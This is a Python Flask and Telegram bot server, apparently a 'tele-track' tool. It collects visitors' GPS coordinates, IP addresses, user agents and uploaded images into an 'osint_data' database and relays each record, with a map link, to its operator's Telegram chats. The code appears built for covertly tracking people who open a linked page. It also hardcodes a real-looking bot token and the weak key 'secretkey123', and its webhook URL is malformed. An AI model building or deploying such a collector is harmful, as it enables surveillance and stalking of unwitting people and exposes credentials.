import os
import sqlite3
from datetime import datetime
from flask import Flask, request, jsonify
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, ContextTypes
import asyncio

# -------------------- Flask Setup --------------------
app = Flask(__name__)

# -------------------- Folder Setup --------------------
SAVE_FOLDER = "saved_files"
os.makedirs(SAVE_FOLDER, exist_ok=True)

# -------------------- Database Setup --------------------
def init_db():
    conn = sqlite3.connect('osint_data.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS osint_data
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  type TEXT,
                  latitude REAL,
                  longitude REAL,
                  accuracy REAL,
                  timestamp TEXT,
                  ip_address TEXT,
                  user_agent TEXT,
                  file_path TEXT)''')
    conn.commit()
    conn.close()

init_db()

# -------------------- Telegram Bot Setup --------------------
TELEGRAM_BOT_TOKEN = "8068204110:AAELqo2Dres3tX5pvlC5O2wopyqFwaP2AM0"
AUTHORIZED_KEY = "secretkey123"
bot = Bot(token=TELEGRAM_BOT_TOKEN)
authenticated_users = set()

# Telegram command handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in authenticated_users:
        await update.message.reply_text("🔒 Please authenticate using /auth <key>")
        return
    await update.message.reply_text("✅ Server is live and bot is running!")

async def auth(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /auth <key>")
        return
    if context.args[0] == AUTHORIZED_KEY:
        authenticated_users.add(user_id)
        await update.message.reply_text("🔑 Authenticated successfully!")
    else:
        await update.message.reply_text("❌ Invalid key!")

async def chatid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🆔 Your chat ID: {update.effective_user.id}")

async def delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in authenticated_users:
        await update.message.reply_text("🔒 You are not authenticated.")
        return

    deleted_files = 0
    for file in os.listdir(SAVE_FOLDER):
        file_path = os.path.join(SAVE_FOLDER, file)
        if os.path.isfile(file_path):
            os.remove(file_path)
            deleted_files += 1

    conn = sqlite3.connect('osint_data.db')
    c = conn.cursor()
    c.execute("DELETE FROM osint_data")
    conn.commit()
    conn.close()

    await update.message.reply_text(f"🗑️ Deleted {deleted_files} image(s) and cleared database.")

# Setup Telegram application and add handlers
application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
application.add_handler(CommandHandler("start", start))
application.add_handler(CommandHandler("auth", auth))
application.add_handler(CommandHandler("chatid", chatid))
application.add_handler(CommandHandler("delete", delete))

# -------------------- Flask Routes --------------------
@app.route('/')
def index():
    return "Welcome! Your bot server is running."

@app.route('/webhook', methods=['POST'])
def webhook():
    """Telegram sends updates here"""
    json_data = request.get_json(force=True)
    update = Update.de_json(json_data, bot)
    asyncio.run(application.process_update(update))
    return jsonify({"status": "ok"})

@app.route('/location', methods=['POST'])
def receive_location():
    data = request.get_json()
    ip_address = request.remote_addr or "Unknown IP"
    user_agent = request.headers.get('User-Agent', 'Unknown User Agent')

    lat = data.get('latitude')
    lon = data.get('longitude')
    accuracy = data.get('accuracy', 'Unknown')

    conn = sqlite3.connect('osint_data.db')
    c = conn.cursor()
    c.execute('''
        INSERT INTO osint_data (type, latitude, longitude, accuracy, timestamp, ip_address, user_agent)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', ("location", lat, lon, accuracy, datetime.utcnow().isoformat(), ip_address, user_agent))
    conn.commit()
    conn.close()

    message = (
        f"📍 *New Location Received:*\n"
        f"Latitude: `{lat}`\n"
        f"Longitude: `{lon}`\n"
        f"Accuracy: ±{accuracy} m\n"
        f"[📍 View on Map](https://www.google.com/maps?q={lat},{lon})\n"
        f"IP: `{ip_address}`\n"
        f"User Agent: `{user_agent}`"
    )
    for user_id in authenticated_users:
        bot.send_message(chat_id=user_id, text=message, parse_mode="Markdown")

    print(f"[Location] IP: {ip_address}, UA: {user_agent}, Coordinates: ({lat}, {lon}), Accuracy: {accuracy}")

    return jsonify({"status": "OK"}), 200

@app.route('/upload_image', methods=['POST'])
def upload_image():
    if 'image' not in request.files:
        return jsonify({"error": "No image uploaded"}), 400

    image_file = request.files['image']
    timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(SAVE_FOLDER, f"image_{timestamp}.jpg")
    image_file.save(filename)

    conn = sqlite3.connect('osint_data.db')
    c = conn.cursor()
    c.execute('''
        INSERT INTO osint_data (type, file_path, timestamp)
        VALUES (?, ?, ?)
    ''', ("image", filename, datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()

    for user_id in authenticated_users:
        with open(filename, "rb") as photo:
            bot.send_photo(chat_id=user_id, photo=photo, caption="🖼️ New Image Uploaded")

    print(f"[Image] Saved and sent: {filename}")

    return jsonify({"status": "OK"}), 200

if __name__ == '__main__':
    # Set Telegram webhook to your Render URL webhook endpoint
    WEBHOOK_URL = "https://https://tele-track-syk8.onrender.com/webhook"  # Replace with your Render URL here
    bot.set_webhook(WEBHOOK_URL)

    port = int(os.environ.get("PORT", 5000))
    print(f"🚀 Starting Flask server on http://0.0.0.0:{port}")
    app.run(host='0.0.0.0', port=port)
